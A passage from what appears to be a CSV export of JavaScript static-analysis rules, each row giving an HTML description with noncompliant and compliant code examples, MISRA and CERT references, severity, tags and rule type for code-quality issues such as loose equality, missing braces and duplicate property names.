try { } catch (args) { }
function x(arg) { }
function args() { }
var y = function fun() { };
var f = new Function(""args"", ""return 17;"");

function fun() {
  if (arguments.length == 0) {
    // do something
  }
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS2137'>S2137</a> instead.</p>",javascript:BoundOrAssignedEvalOrArguments,js,JavaScript,"<p><code>eval</code> is used to evaluate a string as JavaScript code, and <code>arguments</code> is used to access function arguments through indexed
properties. As a consequence, <code>eval</code> and <code>arguments</code> should not be bound or assigned, because doing so would overwrite the
original definitions of those two reserved words.</p>
<p>What's more, using either of those two names to assign or bind will generate an error in JavaScript strict mode code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
eval = 17; // Noncompliant
arguments++; // Noncompliant
++eval; // Noncompliant
var obj = { set p(arguments) { } }; // Noncompliant
var eval; // Noncompliant
try { } catch (arguments) { } // Noncompliant
function x(eval) { } // Noncompliant
function arguments() { } // Noncompliant
var y = function eval() { }; // Noncompliant
var f = new Function(""arguments"", ""return 17;""); // Noncompliant

function fun() {
  if (arguments.length == 0) { // Compliant
    // do something
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
result = 17;
args++;
++result;
var obj = { set p(arg) { } };
var result;
try { } catch (args) { }
function x(arg) { }
function args() { }
var y = function fun() { };
var f = new Function(""args"", ""return 17;"");

function fun() {
  if (arguments.length == 0) {
    // do something
  }
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use {rule:javascript:S2137} instead.</p>","""eval"" and ""arguments"" should not be bound or assigned",[],MAJOR,[],BUG
2013-06-19T07:34:52+0200,"<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be ""commented out"". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be ""commented out"" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be ""commented out"" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be ""commented out"" </li>
</ul>",javascript:CommentedCode,js,JavaScript,"<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be ""commented out"". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be ""commented out"" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be ""commented out"" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be ""commented out"" </li>
</ul>",Sections of code should not be commented out,[],MAJOR,"['misra', 'unused']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Internet Explorer offers a way to change the JavaScript code at runtime using conditional comments (activated by a @cc_on statement found in a
comment). Using this preprocessing feature decreases readability and maintainability, and can hinder automated tools. What's more, it is specific to
Internet Explorer and won't work for other browsers.</p>
<p>Most of the time, using those conditional comments can be easily avoided with some refactoring - using modern cross-browsers JavaScript frameworks
and libraries.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/*@cc_on
  @if (@_jscript_version &gt;= 5.5)
    document.write(""You are using IE5.5 or newer"");
  @else
    document.write(""You are using IE5 or older"");
  @end
  @*/
</pre>",javascript:ConditionalComment,js,JavaScript,"<p>Internet Explorer offers a way to change the JavaScript code at runtime using conditional comments (activated by a @cc_on statement found in a
comment). Using this preprocessing feature decreases readability and maintainability, and can hinder automated tools. What's more, it is specific to
Internet Explorer and won't work for other browsers.</p>
<p>Most of the time, using those conditional comments can be easily avoided with some refactoring - using modern cross-browsers JavaScript frameworks
and libraries.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/*@cc_on
  @if (@_jscript_version &gt;= 5.5)
    document.write(""You are using IE5.5 or newer"");
  @else
    document.write(""You are using IE5 or older"");
  @end
  @*/
</pre>",Internet Explorer's conditional comments should not be used,[],CRITICAL,['cross-browser'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>While the ternary operator is pleasingly compact, its use can make code more difficult to read. It should therefore be avoided in favor of the more
verbose <code>if</code>/<code>else</code> structure.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(a) {
  var b = (a === 'A') ? 'is A' : 'is not A'; // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo(a) {
  var b;
  if (a === 'A') {
    b = 'is A';
  }
  else {
    b = 'is not A';
  }
  // ...
}
</pre>",javascript:ConditionalOperator,js,JavaScript,"<p>While the ternary operator is pleasingly compact, its use can make code more difficult to read. It should therefore be avoided in favor of the more
verbose <code>if</code>/<code>else</code> structure.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(a) {
  var b = (a === 'A') ? 'is A' : 'is not A'; // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo(a) {
  var b;
  if (a === 'A') {
    b = 'is A';
  }
  else {
    b = 'is not A';
  }
  // ...
}
</pre>",The ternary operator should not be used,[],MAJOR,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>There is no good reason to create a new object to not do anything with it. Most of the time, this is due to a missing piece of code and so could
lead to an unexpected behavior in production.</p>
<p>If it was done on purpose because the constructor has side-effects, then that side-effect code should be moved into a separate method and called
directly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
new MyConstructor(); // Non-Compliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var something = new MyConstructor();  // Compliant
</pre>",javascript:ConstructorFunctionsForSideEffects,js,JavaScript,"<p>There is no good reason to create a new object to not do anything with it. Most of the time, this is due to a missing piece of code and so could
lead to an unexpected behavior in production.</p>
<p>If it was done on purpose because the constructor has side-effects, then that side-effect code should be moved into a separate method and called
directly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
new MyConstructor(); // Non-Compliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var something = new MyConstructor();  // Compliant
</pre>",Objects should not be created to be dropped immediately without being used,[],MAJOR,[],BUG
2013-06-19T07:34:52+0200,"<p><code>continue</code> is an unstructured control flow statement. It makes code less testable, less readable and less maintainable. Structured
control flow statements such as <code>if</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  for (i = 0; i &lt; 10; i++) {
    if (i == 5) {
      continue;  /* Noncompliant */
    }
    alert(""i = "" + i);
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
  for (i = 0; i &lt; 10; i++) {
    if (i != 5) {  /* Compliant */
      alert(""i = "" + i);
    }
  }
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.5 - The continue statement shall not be used. </li>
</ul>",javascript:ContinueStatement,js,JavaScript,"<p><code>continue</code> is an unstructured control flow statement. It makes code less testable, less readable and less maintainable. Structured
control flow statements such as <code>if</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  for (i = 0; i &lt; 10; i++) {
    if (i == 5) {
      continue;  /* Noncompliant */
    }
    alert(""i = "" + i);
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
  for (i = 0; i &lt; 10; i++) {
    if (i != 5) {  /* Compliant */
      alert(""i = "" + i);
    }
  }
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.5 - The continue statement shall not be used. </li>
</ul>","""continue"" should not be used",[],MINOR,"['bad-practice', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1QGMAg"">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3wHEAw"">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>",javascript:CurlyBraces,js,JavaScript,"<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1QGMAg"">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3wHEAw"">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>",Control structures should use curly braces,[],CRITICAL,"['cert', 'misra', 'pitfall']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Function arguments should all have different names to prevent any ambiguity. Indeed, if arguments have the same name, the last duplicated argument
hides all the previous arguments with the same name (those previous arguments remain available through arguments[i], so they're not completely
inaccessible).</p>
<p>This hiding makes no sense, reduces understandability and maintainability, and obviously can be error prone. Furthermore, in strict mode, declaring
arguments with the same name produces an error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function compute(a, a, c) { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function compute(a, b, c) { // Compliant
}
</pre>",javascript:DuplicateFunctionArgument,js,JavaScript,"<p>Function arguments should all have different names to prevent any ambiguity. Indeed, if arguments have the same name, the last duplicated argument
hides all the previous arguments with the same name (those previous arguments remain available through arguments[i], so they're not completely
inaccessible).</p>
<p>This hiding makes no sense, reduces understandability and maintainability, and obviously can be error prone. Furthermore, in strict mode, declaring
arguments with the same name produces an error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function compute(a, a, c) { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function compute(a, b, c) { // Compliant
}
</pre>",Function argument names should be unique,[],MAJOR,[],BUG
2013-06-19T07:34:52+0200,"<p>JavaScript allows duplicate property names in classes and object literals, but only the last instance of a duplicated name determines the actual
value that will be used for it. Therefore, changing values of other occurrences of a duplicated name will have no effect and may cause
misunderstandings and bugs.</p>
<p>Defining a <code>class</code> with a duplicated <code>constructor</code> will generate an error.</p>
<p>Before ECMAScript 2015, using duplicate names will generate an error in JavaScript strict mode code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var data = {
  ""key"": ""value"",
  ""1"": ""value"",
  ""key"": ""value"", // Noncompliant - duplicate of ""key""
  'key': ""value"", // Noncompliant - duplicate of ""key""
  key: ""value"", // Noncompliant - duplicate of ""key""
  \u006bey: ""value"", // Noncompliant - duplicate of ""key""
  ""\u006bey"": ""value"", // Noncompliant - duplicate of ""key""
  ""\x6bey"": ""value"", // Noncompliant - duplicate of ""key""
  1: ""value"" // Noncompliant - duplicate of ""1""
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var data = {
  ""key"": ""value"",
  ""1"": ""value"",
  ""key2"": ""value"",
  'key3': ""value"",
  key4: ""value"",
  \u006bey5: ""value"",
  ""\u006bey6"": ""value"",
  ""\x6bey7"": ""value"",
  1b: ""value""
}
</pre>",javascript:DuplicatePropertyName,js,JavaScript,"<p>JavaScript allows duplicate property names in classes and object literals, but only the last instance of a duplicated name determines the actual
value that will be used for it. Therefore, changing values of other occurrences of a duplicated name will have no effect and may cause
misunderstandings and bugs.</p>
<p>Defining a <code>class</code> with a duplicated <code>constructor</code> will generate an error.</p>
<p>Before ECMAScript 2015, using duplicate names will generate an error in JavaScript strict mode code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var data = {
  ""key"": ""value"",
  ""1"": ""value"",
  ""key"": ""value"", // Noncompliant - duplicate of ""key""
  'key': ""value"", // Noncompliant - duplicate of ""key""
  key: ""value"", // Noncompliant - duplicate of ""key""
  \u006bey: ""value"", // Noncompliant - duplicate of ""key""
  ""\u006bey"": ""value"", // Noncompliant - duplicate of ""key""
  ""\x6bey"": ""value"", // Noncompliant - duplicate of ""key""
  1: ""value"" // Noncompliant - duplicate of ""1""
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var data = {
  ""key"": ""value"",
  ""1"": ""value"",
  ""key2"": ""value"",
  'key3': ""value"",
  key4: ""value"",
  \u006bey5: ""value"",
  ""\u006bey6"": ""value"",
  ""\x6bey7"": ""value"",
  1b: ""value""
}
</pre>",Property names should not be duplicated within a class or object literal,[],MAJOR,['pitfall'],BUG
2013-06-19T07:34:52+0200,"<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
} else {
  throw ""Unexpected value for x"";
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>",javascript:ElseIfWithoutElse,js,JavaScript,"<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
} else {
  throw ""Unexpected value for x"";
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>","""if ... else if"" constructs should end with ""else"" clauses",[],CRITICAL,"['cert', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 0; i &lt; length; i++) {}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty. Moreover <code>catch</code> blocks are ignored.</p>",javascript:EmptyBlock,js,JavaScript,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 0; i &lt; length; i++) {}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty. Moreover <code>catch</code> blocks are ignored.</p>",Nested blocks of code should not be left empty,[],MAJOR,['suspicious'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The <code>==</code> and <code>!=</code> operators do type coercion before comparing values. This is bad because it can mask type errors. For
example, it evaluates <code>' \t\r\n' == 0</code> as <code>true</code>.</p>
<p>It is best to always use the side-effect-less <code>===</code> and <code>!==</code> operators instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (var == 'howdy') {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (var === 'howdy') {...}
</pre>
<h2>Exceptions</h2>
<p>Even if testing the equality of a variable against null doesn't do exactly what most JavaScript developers believe, usage of <code>==</code> or
<code>!=</code> is tolerated in such context. In the following case, if <code>foo</code> hasn't been initialized, its default value is not
<code>null</code> but <code>undefined</code>. Nevertheless <code>undefined == null</code>, so JavaScript developers get the expected behavior.</p>
<pre>
if(foo == null) {...}
</pre>",javascript:EqEqEq,js,JavaScript,"<p>The <code>==</code> and <code>!=</code> operators do type coercion before comparing values. This is bad because it can mask type errors. For
example, it evaluates <code>' \t\r\n' == 0</code> as <code>true</code>.</p>
<p>It is best to always use the side-effect-less <code>===</code> and <code>!==</code> operators instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (var == 'howdy') {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (var === 'howdy') {...}
</pre>
<h2>Exceptions</h2>
<p>Even if testing the equality of a variable against null doesn't do exactly what most JavaScript developers believe, usage of <code>==</code> or
<code>!=</code> is tolerated in such context. In the following case, if <code>foo</code> hasn't been initialized, its default value is not
<code>null</code> but <code>undefined</code>. Nevertheless <code>undefined == null</code>, so JavaScript developers get the expected behavior.</p>
<pre>
if(foo == null) {...}
</pre>","""==="" and ""!=="" should be used instead of ""=="" and ""!=""",[],MAJOR,['suspicious'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
function doSomething(param1, param2, param3, param4, param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(param1, param2, param3, param4) {
...
}
</pre>",javascript:ExcessiveParameterList,js,JavaScript,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
function doSomething(param1, param2, param3, param4, param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(param1, param2, param3, param4) {
...
}
</pre>",Functions should not have too many parameters,"[{'key': 'maximumFunctionParameters', 'htmlDesc': 'The maximum authorized number of parameters', 'defaultValue': '7', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The <code>for...in</code> statement allows you to loop through the names of all of the properties of an object. The list of properties includes all
those properties that were inherited through the prototype chain. This has the side effect of serving up functions when the interest is in data
properties. Programs that don't take this into account can fail.</p>
<p>Therefore, the body of every <code>for...in</code> statement should be wrapped in an <code>if</code> statement that filters which properties are
acted upon. It can select for a particular type or range of values, or it can exclude functions, or it can exclude properties from the prototype. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for (name in object) {
    doSomething(name);  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (name in object) {
  if (object.hasOwnProperty(name)) {
    doSomething(name);
  }
}
</pre>
<h2>Exceptions</h2>
<p>Loops used to clone objects are ignored.</p>
<pre>
for (prop in obj) {
  a[prop] = obj[prop];  // Compliant by exception
}
</pre>",javascript:ForIn,js,JavaScript,"<p>The <code>for...in</code> statement allows you to loop through the names of all of the properties of an object. The list of properties includes all
those properties that were inherited through the prototype chain. This has the side effect of serving up functions when the interest is in data
properties. Programs that don't take this into account can fail.</p>
<p>Therefore, the body of every <code>for...in</code> statement should be wrapped in an <code>if</code> statement that filters which properties are
acted upon. It can select for a particular type or range of values, or it can exclude functions, or it can exclude properties from the prototype. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for (name in object) {
    doSomething(name);  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (name in object) {
  if (object.hasOwnProperty(name)) {
    doSomething(name);
  }
}
</pre>
<h2>Exceptions</h2>
<p>Loops used to clone objects are ignored.</p>
<pre>
for (prop in obj) {
  a[prop] = obj[prop];  // Compliant by exception
}
</pre>","""for...in"" loops should filter properties before acting on them",[],MAJOR,[],BUG
2013-06-19T07:34:52+0200,"<p>The Cyclomatic Complexity of functions should not exceed a defined threshold. Complex code may perform poorly and can be difficult to test
thoroughly.</p>",javascript:FunctionComplexity,js,JavaScript,"<p>The Cyclomatic Complexity of functions should not exceed a defined threshold. Complex code may perform poorly and can be difficult to test
thoroughly.</p>",Functions should not be too complex,"[{'key': 'maximumFunctionComplexityThreshold', 'htmlDesc': 'The maximum authorized complexity in function', 'defaultValue': '10', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>While most script engines support function declarations within blocks, it is not part of ECMAScript 5 and below, and from browser to browser the
implementations are inconsistent with each other. ECMAScript 5 and below only allow function declarations in the root statement list of a script or
function. If you are targeting browsers that don't support ECMAScript 6, use a variable initialized with a function expression to define a function
within a block :</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x) {
  function foo() {}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x) {
  var foo = function() {}
}
</pre>",javascript:FunctionDeclarationsWithinBlocks,js,JavaScript,"<p>While most script engines support function declarations within blocks, it is not part of ECMAScript 5 and below, and from browser to browser the
implementations are inconsistent with each other. ECMAScript 5 and below only allow function declarations in the root statement list of a script or
function. If you are targeting browsers that don't support ECMAScript 6, use a variable initialized with a function expression to define a function
within a block :</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x) {
  function foo() {}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x) {
  var foo = function() {}
}
</pre>",Function declarations should not be made within blocks,[],MINOR,"['cross-browser', 'user-experience']",BUG
2013-06-19T07:34:52+0200,"<p>Defining a function inside of a loop can yield unexpected results. Such a function keeps references to the variables which are defined in outer
scopes. All function instances created inside the loop therefore see the same values for these variables, which is probably not expected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var funs = [];
for (var i = 0; i &lt; 13; i++) {
  funs[i] = function() { // Non-Compliant
    return i;
  };
}
console.log(funs[0]()); // 13 instead of 0
console.log(funs[1]()); // 13 instead of 1
console.log(funs[2]()); // 13 instead of 2
console.log(funs[3]()); // 13 instead of 3
...
</pre>",javascript:FunctionDefinitionInsideLoop,js,JavaScript,"<p>Defining a function inside of a loop can yield unexpected results. Such a function keeps references to the variables which are defined in outer
scopes. All function instances created inside the loop therefore see the same values for these variables, which is probably not expected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var funs = [];
for (var i = 0; i &lt; 13; i++) {
  funs[i] = function() { // Non-Compliant
    return i;
  };
}
console.log(funs[0]()); // 13 instead of 0
console.log(funs[1]()); // 13 instead of 1
console.log(funs[2]()); // 13 instead of 2
console.log(funs[3]()); // 13 instead of 3
...
</pre>",Functions should not be defined inside loops,[],MAJOR,['suspicious'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The following words may be used as keywords in future evolutions of the language, so using them as identifiers should be avoided to allow an easier
adoption of those potential future versions:</p>
<ul>
  <li> <code>await</code> </li>
  <li> <code>class</code> </li>
  <li> <code>const</code> </li>
  <li> <code>enum</code> </li>
  <li> <code>export</code> </li>
  <li> <code>extends</code> </li>
  <li> <code>implements</code> </li>
  <li> <code>import</code> </li>
  <li> <code>interface</code> </li>
  <li> <code>let</code> </li>
  <li> <code>package</code> </li>
  <li> <code>private</code> </li>
  <li> <code>protected</code> </li>
  <li> <code>public</code> </li>
  <li> <code>static</code> </li>
  <li> <code>super</code> </li>
  <li> <code>yield</code> </li>
</ul>
<p>Use of these words as identifiers would produce an error in JavaScript <code>strict</code> mode code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var package = document.getElementsByName(""foo""); // Noncompliant
var someData = { package: true };                 // Compliant, as it is not used as an identifier here
</pre>
<h2>Compliant Solution</h2>
<pre>
var elements = document.getElementsByName(""foo""); // Compliant
</pre>",javascript:FutureReservedWords,js,JavaScript,"<p>The following words may be used as keywords in future evolutions of the language, so using them as identifiers should be avoided to allow an easier
adoption of those potential future versions:</p>
<ul>
  <li> <code>await</code> </li>
  <li> <code>class</code> </li>
  <li> <code>const</code> </li>
  <li> <code>enum</code> </li>
  <li> <code>export</code> </li>
  <li> <code>extends</code> </li>
  <li> <code>implements</code> </li>
  <li> <code>import</code> </li>
  <li> <code>interface</code> </li>
  <li> <code>let</code> </li>
  <li> <code>package</code> </li>
  <li> <code>private</code> </li>
  <li> <code>protected</code> </li>
  <li> <code>public</code> </li>
  <li> <code>static</code> </li>
  <li> <code>super</code> </li>
  <li> <code>yield</code> </li>
</ul>
<p>Use of these words as identifiers would produce an error in JavaScript <code>strict</code> mode code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var package = document.getElementsByName(""foo""); // Noncompliant
var someData = { package: true };                 // Compliant, as it is not used as an identifier here
</pre>
<h2>Compliant Solution</h2>
<pre>
var elements = document.getElementsByName(""foo""); // Compliant
</pre>","""future reserved words"" should not be used as identifiers",[],BLOCKER,"['lock-in', 'pitfall']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>HTML-style comments are not part of EcmaScript specification, and should not be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
// Compliant
/* Compliant */
</pre>",javascript:HtmlComments,js,JavaScript,"<p>HTML-style comments are not part of EcmaScript specification, and should not be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
// Compliant
/* Compliant */
</pre>",HTML-style comments should not be used,[],MINOR,['bad-practice'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Any statement or block of statements can be identified by a label, but those labels should be used only on <code>while</code>,
<code>do-while</code> and <code>for</code> statements. Using labels in any other context leads to unstructured, confusing code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
myLabel:if (i % 2 == 0) {  // Noncompliant
  if (i == 12) {
    print(""12"");
    break myLabel;
  }
  print(""Odd number, but not 12"");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
myLabel:for (i = 0; i &lt; 10; i++) {   // Compliant
  print(""Loop"");
  break myLabel;
}
</pre>",javascript:LabelPlacement,js,JavaScript,"<p>Any statement or block of statements can be identified by a label, but those labels should be used only on <code>while</code>,
<code>do-while</code> and <code>for</code> statements. Using labels in any other context leads to unstructured, confusing code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
myLabel:if (i % 2 == 0) {  // Noncompliant
  if (i == 12) {
    print(""12"");
    break myLabel;
  }
  print(""Odd number, but not 12"");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
myLabel:for (i = 0; i &lt; 10; i++) {   // Compliant
  print(""Loop"");
  break myLabel;
}
</pre>","Only ""while"", ""do"" and ""for"" statements should be labelled",[],MAJOR,['pitfall'],CODE_SMELL
2013-06-19T07:34:52+0200,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,javascript:LineLength,js,JavaScript,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,Lines should not be too long,"[{'key': 'maximumLineLength', 'htmlDesc': 'The maximum authorized line length.', 'defaultValue': '180', 'type': 'INTEGER'}]",MAJOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>",javascript:MissingNewlineAtEndOfFile,js,JavaScript,"<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>",Files should contain an empty newline at the end,[],MINOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Continuing a string across a linebreak is supported in most script engines, but it is not a part of ECMAScript. Additionally, the whitespace at the
beginning of each line can't be safely stripped at compile time, and any whitespace after the slash will result in tricky errors.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myString = 'A rather long string of English text, an error message \
                actually that just keeps going and going -- an error \
                message to make the Energizer bunny blush (right through \
